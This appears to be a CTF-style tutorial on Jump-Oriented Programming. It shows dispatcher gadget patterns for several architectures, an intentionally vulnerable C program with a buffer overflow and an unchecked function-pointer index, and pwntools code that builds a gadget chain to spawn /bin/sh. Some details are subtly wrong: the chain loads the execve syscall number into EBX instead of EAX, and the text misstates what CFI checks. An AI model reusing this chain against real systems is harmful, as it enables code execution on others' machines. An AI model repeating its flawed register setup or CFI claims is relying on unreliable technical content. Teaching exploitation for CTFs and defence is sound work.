# Jump-Oriented Programming (JOP)

## Overview

**Jump-Oriented Programming (JOP)** is an advanced code-reuse attack similar to ROP, but uses **jump** instructions instead of `ret` instructions. JOP is particularly effective against defenses that specifically target return-based control flow.

---

## JOP vs ROP

| Feature | ROP | JOP |
|---------|-----|-----|
| **Control Flow** | `ret` instructions | `jmp` / `call` instructions |
| **Stack Usage** | Heavy (each gadget pops from stack) | Minimal (uses registers) |
| **Gadget Ending** | `ret` | `jmp reg` / `call reg` |
| **Detection** | Easier (return address anomalies) | Harder (normal jumps) |
| **Complexity** | Lower | Higher |

---

## JOP Architecture

### Dispatcher Gadget

The **dispatcher** is the core of JOP - it loads the next gadget address and jumps to it:

```asm
; Example dispatcher gadget (x86)
mov eax, [esi]      ; Load next gadget address from memory
add esi, 4          ; Move to next entry
jmp eax             ; Jump to gadget
```

### Functional Gadgets

Regular gadgets that perform operations and return to dispatcher:

```asm
; Functional gadget example
pop ebx             ; Perform operation
jmp [dispatcher]    ; Return to dispatcher
```

### JOP Chain Structure

```
Memory Layout:
┌─────────────────────────────────────┐
│  Gadget Table (controlled memory)   │
│  ┌─────────────────────────────┐    │
│  │ gadget1_addr                │    │  ← ESI points here
│  │ gadget2_addr                │    │
│  │ gadget3_addr                │    │
│  │ ...                         │    │
│  └─────────────────────────────┘    │
└─────────────────────────────────────┘

Execution Flow:
1. Dispatcher loads gadget1_addr into EAX
2. Dispatcher jumps to gadget1
3. Gadget1 executes, jumps back to dispatcher
4. Dispatcher loads gadget2_addr...
5. Repeat
```

---

## Finding JOP Gadgets

### Using ROPgadget
```bash
# Find jump-based gadgets
ROPgadget --binary ./vuln --only "jmp|call"

# Example output:
# 0x08048123 : jmp eax
# 0x08048456 : jmp [eax]
# 0x08048789 : call edx
```

### Dispatcher Gadget Patterns

**x86:**
```asm
; Pattern 1: Register indirect jump
mov eax, [esi]
add esi, 4
jmp eax

; Pattern 2: Memory indirect jump
mov eax, [ebx]
add ebx, 4
jmp [eax]

; Pattern 3: Call-based
mov ecx, [edi]
add edi, 4
call ecx
```

**x64:**
```asm
; Pattern 1: RIP-relative
mov rax, [rsi]
add rsi, 8
jmp rax

; Pattern 2: Indexed
mov rax, [rbx + rcx*8]
inc rcx
jmp rax
```

---

## Vulnerable Code Example

```c
// vuln_jop.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Function pointer table (useful for JOP)
typedef void (*func_ptr)(void);

func_ptr operations[10];

void operation1() { printf("Operation 1\n"); }
void operation2() { printf("Operation 2\n"); }
void operation3() { printf("Operation 3\n"); }

void init_operations() {
    operations[0] = operation1;
    operations[1] = operation2;
    operations[2] = operation3;
}

void vulnerable() {
    char buffer[64];
    int index;
    
    printf("Enter index: ");
    scanf("%d", &index);
    
    printf("Enter data: ");
    read(0, buffer, 200);  // Buffer overflow!
    
    // VULNERABILITY: Unchecked index
    if (index < 10) {
        operations[index]();  // Can be exploited for JOP
    }
}

int main() {
    init_operations();
    vulnerable();
    return 0;
}
```

**Compilation:**
```bash
gcc -o vuln_jop vuln_jop.c -no-pie -fno-stack-protector
```

---

## JOP Exploitation Example

### Step 1: Find Dispatcher

```python
from pwn import *

binary = ELF('./vuln_jop')

# Search for dispatcher pattern
# mov eax, [esi]; add esi, 4; jmp eax
dispatcher = 0x08048XXX  # Found via disassembly
```

### Step 2: Build Gadget Table

```python
# Gadget addresses
gadget_pop_ebx = 0x08048111  # pop ebx; jmp [dispatcher]
gadget_pop_ecx = 0x08048222  # pop ecx; jmp [dispatcher]
gadget_int80 = 0x08048333    # int 0x80; jmp [dispatcher]

# Build table in controlled memory (e.g., heap, BSS)
gadget_table = p32(gadget_pop_ebx)
gadget_table += p32(0x0b)              # EBX = 11 (execve)
gadget_table += p32(gadget_pop_ecx)
gadget_table += p32(binsh_addr)        # ECX = "/bin/sh"
gadget_table += p32(gadget_int80)      # Execute syscall
```

### Step 3: Trigger JOP

```python
# Overflow to control ESI (points to gadget table)
payload = b"A" * offset
payload += p32(gadget_table_addr)  # ESI
payload += p32(dispatcher)         # EIP (start JOP chain)

p.send(payload)
```

---

## ARM JOP

### ARM Dispatcher Pattern

```asm
; ARM dispatcher
ldr r0, [r4]        ; Load next gadget address
add r4, r4, #4      ; Move to next entry
bx r0               ; Branch to gadget (can switch Thumb/ARM)
```

### ARM Functional Gadget

```asm
; Functional gadget
pop {r1}            ; Perform operation
ldr r0, =dispatcher
bx r0               ; Return to dispatcher
```

---

## MIPS JOP

### MIPS Dispatcher Pattern

```asm
; MIPS dispatcher
lw $t0, 0($s0)      ; Load next gadget
addiu $s0, $s0, 4   ; Increment pointer
jr $t0              ; Jump to gadget
nop                 ; Branch delay slot
```

**Challenge:** Branch delay slots make MIPS JOP more complex!

---

## Advanced JOP Techniques

### 1. Hybrid ROP/JOP

Combine both techniques for maximum flexibility:

```python
# Start with ROP to set up registers
payload = b"A" * offset
payload += p64(pop_rsi_ret)      # ROP gadget
payload += p64(gadget_table)     # RSI = gadget table
payload += p64(dispatcher)       # Jump to JOP dispatcher
```

### 2. JOP with Function Pointers

Exploit function pointer arrays:

```c
// Vulnerable pattern
void (*handlers[10])(void);

void process(int idx) {
    handlers[idx]();  // No bounds check!
}
```

**Exploitation:**
```python
# Overwrite handlers array with gadget addresses
# Then trigger via index
```

### 3. JOP for Bypassing CFI

**Control Flow Integrity (CFI)** checks return addresses but not jumps:

```
ROP: ret → CFI checks return address ✗
JOP: jmp → CFI doesn't check jump target ✓
```

---

## Detection and Mitigation

### Detection Challenges

1. **Normal Control Flow:** Jumps are legitimate instructions
2. **No Stack Anomalies:** Doesn't abuse return addresses
3. **Register-Based:** Harder to track than stack-based ROP

### Mitigations

| Mitigation | Effectiveness Against JOP |
|-----------|---------------------------|
| **DEP/NX** | ✗ (JOP reuses existing code) |
| **ASLR** | ✓ (Randomizes gadget addresses) |
| **CFI** | Partial (depends on implementation) |
| **CET (Intel)** | ✓ (Indirect branch tracking) |
| **Code Randomization** | ✓ (Breaks gadget chains) |

---

## CTF Tips

### 1. Finding Dispatchers

```bash
# Search for dispatcher patterns
objdump -d binary | grep -A 2 "mov.*\[.*\]" | grep "jmp"

# Look for:
# - Load from memory
# - Pointer increment
# - Indirect jump
```

### 2. Gadget Table Placement

**Options:**
- **Heap:** Allocate via malloc, control contents
- **BSS:** Overflow into uninitialized data section
- **Stack:** Less common, but possible with large overflow

### 3. Debugging JOP Chains

```bash
gdb ./vuln_jop
(gdb) break *dispatcher
(gdb) commands
> x/i $eax  # Show next gadget
> continue
> end
```

---

## Practice Challenges

### Beginner: Function Pointer Overwrite
```c
void (*func_ptr)(void) = safe_function;
// Overflow to overwrite func_ptr with gadget address
```

### Intermediate: Dispatcher-Based JOP
- Find dispatcher gadget
- Build gadget table
- Chain 3+ gadgets

### Advanced: Blind JOP
- No binary provided
- Leak gadget addresses
- Build JOP chain remotely

---

## Further Reading

- [JOP: Jump-Oriented Programming (Original Paper)](https://www.comp.nus.edu.sg/~liangzk/papers/asiaccs11.pdf)
- [Bypassing CFI with JOP](https://www.usenix.org/conference/usenixsecurity14/technical-sessions/presentation/carlini)
- [ROPgadget JOP Mode](https://github.com/JonathanSalwan/ROPgadget)

---

**Related:** [ROP](../ROP/) | [SROP](../SROP/)
